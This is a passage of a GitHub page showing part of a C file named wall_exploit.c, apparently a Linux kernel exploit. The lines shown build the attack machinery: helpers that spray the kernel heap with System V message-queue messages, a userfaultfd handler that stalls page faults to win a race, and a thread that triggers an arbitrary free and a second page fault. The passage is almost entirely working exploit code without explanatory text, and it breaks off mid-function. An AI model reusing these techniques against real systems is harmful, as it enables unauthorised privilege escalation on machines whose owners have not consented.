          <td id="file-wall_exploit-c-LC185" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">msgrcv</span>(msqid, msgp, msgsz, msgtyp, msgflg) &lt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L186" class="blob-num js-line-number js-code-nav-line-number" data-line-number="186"></td>
          <td id="file-wall_exploit-c-LC186" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L187" class="blob-num js-line-number js-code-nav-line-number" data-line-number="187"></td>
          <td id="file-wall_exploit-c-LC187" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgrcv<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L188" class="blob-num js-line-number js-code-nav-line-number" data-line-number="188"></td>
          <td id="file-wall_exploit-c-LC188" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L189" class="blob-num js-line-number js-code-nav-line-number" data-line-number="189"></td>
          <td id="file-wall_exploit-c-LC189" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L190" class="blob-num js-line-number js-code-nav-line-number" data-line-number="190"></td>
          <td id="file-wall_exploit-c-LC190" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L191" class="blob-num js-line-number js-code-nav-line-number" data-line-number="191"></td>
          <td id="file-wall_exploit-c-LC191" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L192" class="blob-num js-line-number js-code-nav-line-number" data-line-number="192"></td>
          <td id="file-wall_exploit-c-LC192" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L193" class="blob-num js-line-number js-code-nav-line-number" data-line-number="193"></td>
          <td id="file-wall_exploit-c-LC193" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">send_msg</span>(<span class="pl-k">int</span> msqid, <span class="pl-k">void</span> *msgp, <span class="pl-c1">size_t</span> msgsz, <span class="pl-k">int</span> msgflg)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L194" class="blob-num js-line-number js-code-nav-line-number" data-line-number="194"></td>
          <td id="file-wall_exploit-c-LC194" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L195" class="blob-num js-line-number js-code-nav-line-number" data-line-number="195"></td>
          <td id="file-wall_exploit-c-LC195" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">msgsnd</span>(msqid, msgp, msgsz, msgflg) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L196" class="blob-num js-line-number js-code-nav-line-number" data-line-number="196"></td>
          <td id="file-wall_exploit-c-LC196" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L197" class="blob-num js-line-number js-code-nav-line-number" data-line-number="197"></td>
          <td id="file-wall_exploit-c-LC197" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgsend failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L198" class="blob-num js-line-number js-code-nav-line-number" data-line-number="198"></td>
          <td id="file-wall_exploit-c-LC198" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L199" class="blob-num js-line-number js-code-nav-line-number" data-line-number="199"></td>
          <td id="file-wall_exploit-c-LC199" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L200" class="blob-num js-line-number js-code-nav-line-number" data-line-number="200"></td>
          <td id="file-wall_exploit-c-LC200" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L201" class="blob-num js-line-number js-code-nav-line-number" data-line-number="201"></td>
          <td id="file-wall_exploit-c-LC201" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L202" class="blob-num js-line-number js-code-nav-line-number" data-line-number="202"></td>
          <td id="file-wall_exploit-c-LC202" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L203" class="blob-num js-line-number js-code-nav-line-number" data-line-number="203"></td>
          <td id="file-wall_exploit-c-LC203" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">generic_msg_spray</span>(<span class="pl-k">unsigned</span> <span class="pl-k">int</span> size, <span class="pl-k">unsigned</span> <span class="pl-k">int</span> amount)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L204" class="blob-num js-line-number js-code-nav-line-number" data-line-number="204"></td>
          <td id="file-wall_exploit-c-LC204" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L205" class="blob-num js-line-number js-code-nav-line-number" data-line-number="205"></td>
          <td id="file-wall_exploit-c-LC205" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> qid;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L206" class="blob-num js-line-number js-code-nav-line-number" data-line-number="206"></td>
          <td id="file-wall_exploit-c-LC206" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> buffer[<span class="pl-c1">0x1000</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L207" class="blob-num js-line-number js-code-nav-line-number" data-line-number="207"></td>
          <td id="file-wall_exploit-c-LC207" class="blob-code blob-code-inner js-file-line">    msg *spray = (msg *)buffer;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L208" class="blob-num js-line-number js-code-nav-line-number" data-line-number="208"></td>
          <td id="file-wall_exploit-c-LC208" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L209" class="blob-num js-line-number js-code-nav-line-number" data-line-number="209"></td>
          <td id="file-wall_exploit-c-LC209" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">assert</span>(size &gt;= <span class="pl-c1">0x31</span> &amp;&amp; size &lt;= <span class="pl-c1">0x1000</span> - <span class="pl-c1">0x8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L210" class="blob-num js-line-number js-code-nav-line-number" data-line-number="210"></td>
          <td id="file-wall_exploit-c-LC210" class="blob-code blob-code-inner js-file-line">    spray-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L211" class="blob-num js-line-number js-code-nav-line-number" data-line-number="211"></td>
          <td id="file-wall_exploit-c-LC211" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(spray-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0</span>, size);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L212" class="blob-num js-line-number js-code-nav-line-number" data-line-number="212"></td>
          <td id="file-wall_exploit-c-LC212" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L213" class="blob-num js-line-number js-code-nav-line-number" data-line-number="213"></td>
          <td id="file-wall_exploit-c-LC213" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((qid = <span class="pl-c1">msgget</span>(IPC_PRIVATE, <span class="pl-c1">0666</span> | IPC_CREAT)) == -<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L214" class="blob-num js-line-number js-code-nav-line-number" data-line-number="214"></td>
          <td id="file-wall_exploit-c-LC214" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L215" class="blob-num js-line-number js-code-nav-line-number" data-line-number="215"></td>
          <td id="file-wall_exploit-c-LC215" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgget failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L216" class="blob-num js-line-number js-code-nav-line-number" data-line-number="216"></td>
          <td id="file-wall_exploit-c-LC216" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L217" class="blob-num js-line-number js-code-nav-line-number" data-line-number="217"></td>
          <td id="file-wall_exploit-c-LC217" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L218" class="blob-num js-line-number js-code-nav-line-number" data-line-number="218"></td>
          <td id="file-wall_exploit-c-LC218" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; amount; i++)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L219" class="blob-num js-line-number js-code-nav-line-number" data-line-number="219"></td>
          <td id="file-wall_exploit-c-LC219" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L220" class="blob-num js-line-number js-code-nav-line-number" data-line-number="220"></td>
          <td id="file-wall_exploit-c-LC220" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">msgsnd</span>(qid, spray, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L221" class="blob-num js-line-number js-code-nav-line-number" data-line-number="221"></td>
          <td id="file-wall_exploit-c-LC221" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L222" class="blob-num js-line-number js-code-nav-line-number" data-line-number="222"></td>
          <td id="file-wall_exploit-c-LC222" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgsend failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L223" class="blob-num js-line-number js-code-nav-line-number" data-line-number="223"></td>
          <td id="file-wall_exploit-c-LC223" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L224" class="blob-num js-line-number js-code-nav-line-number" data-line-number="224"></td>
          <td id="file-wall_exploit-c-LC224" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L225" class="blob-num js-line-number js-code-nav-line-number" data-line-number="225"></td>
          <td id="file-wall_exploit-c-LC225" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L226" class="blob-num js-line-number js-code-nav-line-number" data-line-number="226"></td>
          <td id="file-wall_exploit-c-LC226" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L227" class="blob-num js-line-number js-code-nav-line-number" data-line-number="227"></td>
          <td id="file-wall_exploit-c-LC227" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L228" class="blob-num js-line-number js-code-nav-line-number" data-line-number="228"></td>
          <td id="file-wall_exploit-c-LC228" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L229" class="blob-num js-line-number js-code-nav-line-number" data-line-number="229"></td>
          <td id="file-wall_exploit-c-LC229" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">debug</span>()</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L230" class="blob-num js-line-number js-code-nav-line-number" data-line-number="230"></td>
          <td id="file-wall_exploit-c-LC230" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L231" class="blob-num js-line-number js-code-nav-line-number" data-line-number="231"></td>
          <td id="file-wall_exploit-c-LC231" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>pause<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L232" class="blob-num js-line-number js-code-nav-line-number" data-line-number="232"></td>
          <td id="file-wall_exploit-c-LC232" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">getchar</span>();</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L233" class="blob-num js-line-number js-code-nav-line-number" data-line-number="233"></td>
          <td id="file-wall_exploit-c-LC233" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L234" class="blob-num js-line-number js-code-nav-line-number" data-line-number="234"></td>
          <td id="file-wall_exploit-c-LC234" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L235" class="blob-num js-line-number js-code-nav-line-number" data-line-number="235"></td>
          <td id="file-wall_exploit-c-LC235" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L236" class="blob-num js-line-number js-code-nav-line-number" data-line-number="236"></td>
          <td id="file-wall_exploit-c-LC236" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">trigger_second</span>(<span class="pl-k">void</span> *arg)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L237" class="blob-num js-line-number js-code-nav-line-number" data-line-number="237"></td>
          <td id="file-wall_exploit-c-LC237" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L238" class="blob-num js-line-number js-code-nav-line-number" data-line-number="238"></td>
          <td id="file-wall_exploit-c-LC238" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> size = <span class="pl-c1">0x1010</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L239" class="blob-num js-line-number js-code-nav-line-number" data-line-number="239"></td>
          <td id="file-wall_exploit-c-LC239" class="blob-code blob-code-inner js-file-line">    msg *dummy_chunk = (<span class="pl-k">void</span> *)race_page2 - <span class="pl-c1">8</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L240" class="blob-num js-line-number js-code-nav-line-number" data-line-number="240"></td>
          <td id="file-wall_exploit-c-LC240" class="blob-code blob-code-inner js-file-line">    dummy_chunk-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">10</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L241" class="blob-num js-line-number js-code-nav-line-number" data-line-number="241"></td>
          <td id="file-wall_exploit-c-LC241" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>arb freed new segment and triggering second pagefaults<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L242" class="blob-num js-line-number js-code-nav-line-number" data-line-number="242"></td>
          <td id="file-wall_exploit-c-LC242" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">send_msg</span>(final_qid, dummy_chunk, size-<span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L243" class="blob-num js-line-number js-code-nav-line-number" data-line-number="243"></td>
          <td id="file-wall_exploit-c-LC243" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L244" class="blob-num js-line-number js-code-nav-line-number" data-line-number="244"></td>
          <td id="file-wall_exploit-c-LC244" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L245" class="blob-num js-line-number js-code-nav-line-number" data-line-number="245"></td>
          <td id="file-wall_exploit-c-LC245" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L246" class="blob-num js-line-number js-code-nav-line-number" data-line-number="246"></td>
          <td id="file-wall_exploit-c-LC246" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">first_hang</span>(<span class="pl-k">void</span> *arg)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L247" class="blob-num js-line-number js-code-nav-line-number" data-line-number="247"></td>
          <td id="file-wall_exploit-c-LC247" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L248" class="blob-num js-line-number js-code-nav-line-number" data-line-number="248"></td>
          <td id="file-wall_exploit-c-LC248" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffd_msg uf_msg;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L249" class="blob-num js-line-number js-code-nav-line-number" data-line-number="249"></td>
          <td id="file-wall_exploit-c-LC249" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_copy uf_copy;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L250" class="blob-num js-line-number js-code-nav-line-number" data-line-number="250"></td>
          <td id="file-wall_exploit-c-LC250" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_range uf_range;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L251" class="blob-num js-line-number js-code-nav-line-number" data-line-number="251"></td>
          <td id="file-wall_exploit-c-LC251" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">long</span> uffd = (<span class="pl-k">long</span>)arg;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L252" class="blob-num js-line-number js-code-nav-line-number" data-line-number="252"></td>
          <td id="file-wall_exploit-c-LC252" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> pollfd pollfd;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L253" class="blob-num js-line-number js-code-nav-line-number" data-line-number="253"></td>
          <td id="file-wall_exploit-c-LC253" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> nready;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L254" class="blob-num js-line-number js-code-nav-line-number" data-line-number="254"></td>
          <td id="file-wall_exploit-c-LC254" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L255" class="blob-num js-line-number js-code-nav-line-number" data-line-number="255"></td>
          <td id="file-wall_exploit-c-LC255" class="blob-code blob-code-inner js-file-line">    pollfd.<span class="pl-smi">fd</span> = uffd;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L256" class="blob-num js-line-number js-code-nav-line-number" data-line-number="256"></td>
          <td id="file-wall_exploit-c-LC256" class="blob-code blob-code-inner js-file-line">    pollfd.<span class="pl-smi">events</span> = POLLIN;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L257" class="blob-num js-line-number js-code-nav-line-number" data-line-number="257"></td>
          <td id="file-wall_exploit-c-LC257" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L258" class="blob-num js-line-number js-code-nav-line-number" data-line-number="258"></td>
          <td id="file-wall_exploit-c-LC258" class="blob-code blob-code-inner js-file-line">    uf_range.<span class="pl-smi">start</span> = race_page1;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L259" class="blob-num js-line-number js-code-nav-line-number" data-line-number="259"></td>
          <td id="file-wall_exploit-c-LC259" class="blob-code blob-code-inner js-file-line">    uf_range.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L260" class="blob-num js-line-number js-code-nav-line-number" data-line-number="260"></td>
          <td id="file-wall_exploit-c-LC260" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L261" class="blob-num js-line-number js-code-nav-line-number" data-line-number="261"></td>
          <td id="file-wall_exploit-c-LC261" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span>(<span class="pl-c1">poll</span>(&amp;pollfd, <span class="pl-c1">1</span>, -<span class="pl-c1">1</span>) &gt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L262" class="blob-num js-line-number js-code-nav-line-number" data-line-number="262"></td>
          <td id="file-wall_exploit-c-LC262" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L263" class="blob-num js-line-number js-code-nav-line-number" data-line-number="263"></td>
          <td id="file-wall_exploit-c-LC263" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(pollfd.<span class="pl-smi">revents</span> &amp; POLLERR || pollfd.<span class="pl-smi">revents</span> &amp; POLLHUP)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L264" class="blob-num js-line-number js-code-nav-line-number" data-line-number="264"></td>
          <td id="file-wall_exploit-c-LC264" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L265" class="blob-num js-line-number js-code-nav-line-number" data-line-number="265"></td>
          <td id="file-wall_exploit-c-LC265" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>polling error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L266" class="blob-num js-line-number js-code-nav-line-number" data-line-number="266"></td>
          <td id="file-wall_exploit-c-LC266" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L267" class="blob-num js-line-number js-code-nav-line-number" data-line-number="267"></td>
          <td id="file-wall_exploit-c-LC267" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L268" class="blob-num js-line-number js-code-nav-line-number" data-line-number="268"></td>
          <td id="file-wall_exploit-c-LC268" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span> reading the event</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L269" class="blob-num js-line-number js-code-nav-line-number" data-line-number="269"></td>
          <td id="file-wall_exploit-c-LC269" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(<span class="pl-c1">read</span>(uffd, &amp;uf_msg, <span class="pl-k">sizeof</span>(uf_msg)) == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L270" class="blob-num js-line-number js-code-nav-line-number" data-line-number="270"></td>
          <td id="file-wall_exploit-c-LC270" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L271" class="blob-num js-line-number js-code-nav-line-number" data-line-number="271"></td>
          <td id="file-wall_exploit-c-LC271" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error reading event<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L272" class="blob-num js-line-number js-code-nav-line-number" data-line-number="272"></td>
          <td id="file-wall_exploit-c-LC272" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L273" class="blob-num js-line-number js-code-nav-line-number" data-line-number="273"></td>
          <td id="file-wall_exploit-c-LC273" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L274" class="blob-num js-line-number js-code-nav-line-number" data-line-number="274"></td>
          <td id="file-wall_exploit-c-LC274" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(uf_msg.<span class="pl-smi">event</span> != UFFD_EVENT_PAGEFAULT)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L275" class="blob-num js-line-number js-code-nav-line-number" data-line-number="275"></td>
          <td id="file-wall_exploit-c-LC275" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L276" class="blob-num js-line-number js-code-nav-line-number" data-line-number="276"></td>
          <td id="file-wall_exploit-c-LC276" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>unexpected result from event<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L277" class="blob-num js-line-number js-code-nav-line-number" data-line-number="277"></td>
          <td id="file-wall_exploit-c-LC277" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L278" class="blob-num js-line-number js-code-nav-line-number" data-line-number="278"></td>
          <td id="file-wall_exploit-c-LC278" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L279" class="blob-num js-line-number js-code-nav-line-number" data-line-number="279"></td>
          <td id="file-wall_exploit-c-LC279" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L280" class="blob-num js-line-number js-code-nav-line-number" data-line-number="280"></td>
          <td id="file-wall_exploit-c-LC280" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> uf_buffer[<span class="pl-c1">0x1000</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L281" class="blob-num js-line-number js-code-nav-line-number" data-line-number="281"></td>
          <td id="file-wall_exploit-c-LC281" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>caught pagefault on 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, race_page1);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L282" class="blob-num js-line-number js-code-nav-line-number" data-line-number="282"></td>
          <td id="file-wall_exploit-c-LC282" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span> arb free the segment</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L283" class="blob-num js-line-number js-code-nav-line-number" data-line-number="283"></td>
          <td id="file-wall_exploit-c-LC283" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">get_msg</span>(front_qid, uf_buffer, <span class="pl-c1">0x1000</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L284" class="blob-num js-line-number js-code-nav-line-number" data-line-number="284"></td>
          <td id="file-wall_exploit-c-LC284" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L285" class="blob-num js-line-number js-code-nav-line-number" data-line-number="285"></td>
          <td id="file-wall_exploit-c-LC285" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">src</span> = (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)uf_buffer;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L286" class="blob-num js-line-number js-code-nav-line-number" data-line-number="286"></td>
          <td id="file-wall_exploit-c-LC286" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">dst</span> = race_page1;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L287" class="blob-num js-line-number js-code-nav-line-number" data-line-number="287"></td>
          <td id="file-wall_exploit-c-LC287" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L288" class="blob-num js-line-number js-code-nav-line-number" data-line-number="288"></td>
          <td id="file-wall_exploit-c-LC288" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">mode</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L289" class="blob-num js-line-number js-code-nav-line-number" data-line-number="289"></td>
          <td id="file-wall_exploit-c-LC289" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">copy</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L290" class="blob-num js-line-number js-code-nav-line-number" data-line-number="290"></td>
          <td id="file-wall_exploit-c-LC290" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L291" class="blob-num js-line-number js-code-nav-line-number" data-line-number="291"></td>
          <td id="file-wall_exploit-c-LC291" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(<span class="pl-c1">pthread_create</span>(&amp;thread3, <span class="pl-c1">NULL</span>, trigger_second, <span class="pl-c1">NULL</span>) != <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L292" class="blob-num js-line-number js-code-nav-line-number" data-line-number="292"></td>
          <td id="file-wall_exploit-c-LC292" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L293" class="blob-num js-line-number js-code-nav-line-number" data-line-number="293"></td>
